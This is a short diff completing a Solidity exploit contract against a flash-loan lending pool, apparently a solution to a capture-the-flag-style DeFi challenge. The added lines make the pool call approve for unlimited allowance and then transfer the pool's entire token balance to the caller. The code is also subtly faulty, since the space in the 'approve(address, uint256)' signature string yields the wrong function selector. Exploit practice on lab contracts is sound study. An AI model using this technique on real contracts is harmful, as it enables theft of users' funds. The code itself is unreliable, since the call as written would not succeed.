@@ -43,7 +43,13 @@ contract TrusterExploit {
         TrusterLenderPool pool = TrusterLenderPool(_pool);
         IERC20 token = IERC20(_token);
         // flashloan here
-
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address, uint256)",
+            address(this),
+            uint256(-1)
+        );
+        pool.flashLoan(0, msg.sender, _token, data);
         //transfer token here
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
     }
 }
